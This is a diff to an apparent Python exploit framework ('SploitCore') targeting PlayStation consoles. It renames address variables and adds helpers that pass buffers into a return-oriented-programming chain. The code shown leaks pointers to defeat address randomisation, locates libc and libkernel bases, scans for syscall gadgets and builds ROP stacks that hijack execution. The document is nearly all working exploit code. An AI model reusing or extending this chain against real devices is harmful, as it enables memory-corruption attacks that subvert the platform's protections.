@@ -248,6 +248,21 @@ def to_hex(data):
     return str(data).encode("hex")
 
 
+def alloc(size):
+    ba = bytearray(size)
+    nogc.append(ba)
+    return ba
+
+
+def get_ref_addr(obj):
+    if isinstance(obj, bytearray):
+        return refbytearray(obj)
+    elif isinstance(obj, str):
+        return refbytes(obj)
+    else:
+        raise Exception("Unsupported object type for get_ref_addr")
+
+
 ###############
 ## UNSAFE PY ##
 ###############
@@ -464,8 +479,8 @@ class SploitCore(object):
         )
         debugprint("[*] FunctionType.tp_repr address: 0x%x" % func_repr_addr)
 
-        self.exec_base_addr = func_repr_addr - SELECTED_EXEC["func_repr"]
-        debugprint("[*] Executable base address: 0x%x" % self.exec_base_addr)
+        self.exec_addr = func_repr_addr - SELECTED_EXEC["func_repr"]
+        debugprint("[*] Executable base address: 0x%x" % self.exec_addr)
         self.modules = {}
 
         # Use hardcoded gadgets
@@ -518,7 +533,7 @@ class SploitCore(object):
         SEGMENTS_OFFSET = 0x160
 
         self.libc_addr = (
-            readuint(self.exec_base_addr + SELECTED_EXEC["strcmp"], 8)
+            readuint(self.exec_addr + SELECTED_EXEC["strcmp"], 8)
             - SELECTED_LIBC["strcmp"]
         )
         debugprint("[*] libc base address: 0x%x" % self.libc_addr)
@@ -548,19 +563,19 @@ class SploitCore(object):
         if ret != 0:
             raise Exception("sceKernelGetModuleInfoFromAddr failed: 0x%x" % ret)
 
-        self.libkernel_base = struct.unpack(
+        self.libkernel_addr = struct.unpack(
             "<Q", mod_info[SEGMENTS_OFFSET : SEGMENTS_OFFSET + 8]
         )[0]
-        debugprint("[*] libkernel base address: 0x%x" % self.libkernel_base)
+        debugprint("[*] libkernel base address: 0x%x" % self.libkernel_addr)
 
         init_proc_addr = struct.unpack(
             "<Q", mod_info[INIT_PROC_ADDR_OFFSET : INIT_PROC_ADDR_OFFSET + 8]
         )[0]
-        delta = self.libkernel_base - init_proc_addr
+        delta = self.libkernel_addr - init_proc_addr
 
         if delta == 0:
             self.platform = "ps4"
-            libkernel_buf = readbuf(self.libkernel_base, 0x40000)
+            libkernel_buf = readbuf(self.libkernel_addr, 0x40000)
             pattern = (
                 0x48,
                 0xC7,
@@ -585,7 +600,7 @@ class SploitCore(object):
                     syscall_number = struct.unpack(
                         "<I", libkernel_buf[idx + 3 : idx + 7]
                     )[0]
-                    syscall_gadget_addr = self.libkernel_base + idx
+                    syscall_gadget_addr = self.libkernel_addr + idx
                     self.syscall_table[syscall_number] = syscall_gadget_addr
             if not self.syscall_table:
                 raise Exception("syscall gadget pattern not found")
@@ -631,7 +646,22 @@ class SploitCore(object):
         if len(args) > 51:
             raise Exception("Too many arguments")
 
+        if isinstance(rdi, (bytearray, str)):
+            rdi = self.get_ref_addr(rdi)
+        if isinstance(rsi, (bytearray, str)):
+            rsi = self.get_ref_addr(rsi)
+        if isinstance(rdx, (bytearray, str)):
+            rdx = self.get_ref_addr(rdx)
+        if isinstance(rcx, (bytearray, str)):
+            rcx = self.get_ref_addr(rcx)
+        if isinstance(r8, (bytearray, str)):
+            r8 = self.get_ref_addr(r8)
+        if isinstance(r9, (bytearray, str)):
+            r9 = self.get_ref_addr(r9)
+
         for i, arg in enumerate(args):
+            if isinstance(arg, (bytearray, str)):
+                arg = self.get_ref_addr(arg)
             args_stack[i] = arg
 
         stack_data = bytes(
@@ -642,29 +672,29 @@ class SploitCore(object):
                     ],
                     flat(
                         [
-                            self.exec_base_addr + self.gadgets["add rsp, 0x1b8; ret"],
+                            self.exec_addr + self.gadgets["add rsp, 0x1b8; ret"],
                         ],
                         [0] * 55,
                     )
                     * 16,  # for stack alignment and stability
                     (
                         [
-                            self.exec_base_addr + self.gadgets["pop rax; ret"],
+                            self.exec_addr + self.gadgets["pop rax; ret"],
                             func_addr,  # use func_addr as syscall number
                         ]
                         if syscall
                         else []
                     )
                     + [
-                        self.exec_base_addr + self.gadgets["pop rsi; ret"],
+                        self.exec_addr + self.gadgets["pop rsi; ret"],
                         rsi if rsi is not None else 0,
-                        self.exec_base_addr + self.gadgets["pop rdx; ret"],
+                        self.exec_addr + self.gadgets["pop rdx; ret"],
                         rdx if rdx is not None else 0,
-                        self.exec_base_addr + self.gadgets["pop rcx; ret"],
+                        self.exec_addr + self.gadgets["pop rcx; ret"],
                         rcx if rcx is not None else 0,
-                        self.exec_base_addr + self.gadgets["pop r8; ret"],
+                        self.exec_addr + self.gadgets["pop r8; ret"],
                         r8 if r8 is not None else 0,
-                        self.exec_base_addr + self.gadgets["pop r9; ret"],
+                        self.exec_addr + self.gadgets["pop r9; ret"],
                         r9 if r9 is not None else 0,
                     ],
                     [
@@ -677,25 +707,24 @@ class SploitCore(object):
                                 else self.syscall_table.get(func_addr, 0)
                             )
                         ),
-                        self.exec_base_addr + self.gadgets["add rsp, 0x1b8; ret"],
+                        self.exec_addr + self.gadgets["add rsp, 0x1b8; ret"],
                     ],
                     [0] * 4,
                     args_stack,
                     [
-                        self.exec_base_addr + self.gadgets["pop rsi; ret"],
+                        self.exec_addr + self.gadgets["pop rsi; ret"],
                         refbytes(return_value),
-                        self.exec_base_addr + self.gadgets["mov [rsi], rax; ret"],
+                        self.exec_addr + self.gadgets["mov [rsi], rax; ret"],
                     ],
                     [
-                        self.exec_base_addr + self.gadgets["pop r8; ret"],
+                        self.exec_addr + self.gadgets["pop r8; ret"],
                         addrof(None) + 0x7D,
-                        self.exec_base_addr + self.gadgets["pop rcx; ret"],
+                        self.exec_addr + self.gadgets["pop rcx; ret"],
                         1,
-                        self.exec_base_addr + self.gadgets["add [r8 - 0x7d], rcx; ret"],
-                        self.exec_base_addr + self.gadgets["pop rax; ret"],
+                        self.exec_addr + self.gadgets["add [r8 - 0x7d], rcx; ret"],
+                        self.exec_addr + self.gadgets["pop rax; ret"],
                         addrof(None),
-                        self.exec_base_addr
-                        + self.gadgets["mov rsp, rbp; pop rbp; ret"],
+                        self.exec_addr + self.gadgets["mov rsp, rbp; pop rbp; ret"],
                     ],
                 )
             )
@@ -712,7 +741,7 @@ class SploitCore(object):
 
         # Set rip
         self.call_functype[16 * 8 : 16 * 8 + 8] = p64a(
-            self.exec_base_addr
+            self.exec_addr
             + self.gadgets["push rbp; mov rbp, rsp; xor esi, esi; call [rdi + 0x130]"]
         )
         self.call_contextbuf[8:16] = p64a(self.call_functype_ptr)
